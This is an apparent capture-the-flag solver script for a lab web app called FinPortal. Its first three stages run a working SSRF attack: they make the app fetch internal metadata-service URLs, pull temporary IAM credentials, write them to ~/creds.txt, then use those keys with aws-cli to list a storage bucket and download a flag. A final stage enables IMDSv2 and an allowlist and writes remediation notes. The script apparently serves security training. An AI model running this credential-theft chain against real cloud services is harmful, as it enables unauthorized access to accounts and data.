#!/bin/bash
set -uo pipefail

WEB="${WEB:-web}"
STORAGE="${STORAGE:-storage}"
IMDS_INTERNAL="${IMDS_INTERNAL:-imds}"

enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }

echo "== [1/4] Stage 1 - discover_ssrf: force FinPortal to fetch internal targets =="
curl -s "http://$WEB:8080/import?document_url=$(enc http://127.0.0.1:8080/health)"; echo
curl -s "http://$WEB:8080/import?document_url=$(enc http://$IMDS_INTERNAL/latest/meta-data/)"; echo

echo "== [2/4] Stage 2 - steal_credentials: SSRF -> IMDS -> temporary credentials =="
ROLE=$(curl -s "http://$WEB:8080/import?document_url=$(enc http://$IMDS_INTERNAL/latest/meta-data/iam/security-credentials/)" | tr -d '\r\n')
echo "Role: $ROLE"
CREDS=$(curl -s "http://$WEB:8080/import?document_url=$(enc http://$IMDS_INTERNAL/latest/meta-data/iam/security-credentials/$ROLE)")
echo "$CREDS" | tee ~/creds.txt
AK=$(echo "$CREDS" | jq -r .AccessKeyId)
SK=$(echo "$CREDS" | jq -r .SecretAccessKey)
echo "AccessKeyId=$AK"

echo "== [3/4] Stage 3 - access_storage_get_flag: aws-cli + stolen credentials =="
export AWS_ACCESS_KEY_ID="$AK"
export AWS_SECRET_ACCESS_KEY="$SK"
unset AWS_SESSION_TOKEN
export AWS_DEFAULT_REGION=us-east-1
aws --endpoint-url "http://$STORAGE:9000" s3 ls
aws --endpoint-url "http://$STORAGE:9000" s3 ls "s3://fin-reports/"
aws --endpoint-url "http://$STORAGE:9000" s3 cp "s3://fin-reports/flag.txt" ./flag.txt
cat ./flag.txt; echo
cp ./flag.txt ~/loot.txt
echo "Flag saved to ~/loot.txt: $(cat ~/loot.txt)"

echo "== [4/4] Stage 4 - harden_ssrf_imds (via the FinPortal /admin page) =="
echo "-- 4a. Enable IMDSv2 (web relays to imds) --"
curl -s -X POST "http://$WEB:8080/admin/enable-imdsv2"; echo
echo "-- 4b. Classic SSRF is now rejected by IMDSv2 (expect 401) --"
curl -s -o /dev/null -w "HTTP_STATUS=%{http_code}\n" \
  "http://$WEB:8080/import?document_url=$(enc http://$IMDS_INTERNAL/latest/meta-data/iam/security-credentials/$ROLE)"
echo "-- 4c. Legitimate IMDSv2 demo (web relays) --"
curl -s "http://$WEB:8080/admin/imdsv2-demo" | jq .
echo "-- 4d. Enable the SSRF allowlist on FinPortal --"
curl -s -X POST "http://$WEB:8080/admin/harden"; echo
echo "-- 4e. SSRF to imds is now blocked at the application layer (expect 403) --"
curl -s -o /dev/null -w "HTTP_STATUS=%{http_code}\n" \
  "http://$WEB:8080/import?document_url=$(enc http://$IMDS_INTERNAL/latest/meta-data/iam/security-credentials/$ROLE)"
echo "-- 4f. Write remediation.txt --"
cat > ~/remediation.txt <<'REM'
1. SSRF protection: enable a host allowlist + block internal/link-local IP ranges (169.254.169.254).
2. IMDSv2: require a PUT token, hop limit = 1.
3. Least privilege: role only gets s3:GetObject on a specific prefix, no list/write on the whole bucket.
REM
cat ~/remediation.txt

echo; echo "== solver.sh DONE =="
echo "Check: ~/loot.txt (flag), ~/creds.txt (credentials), ~/remediation.txt (hardening)"
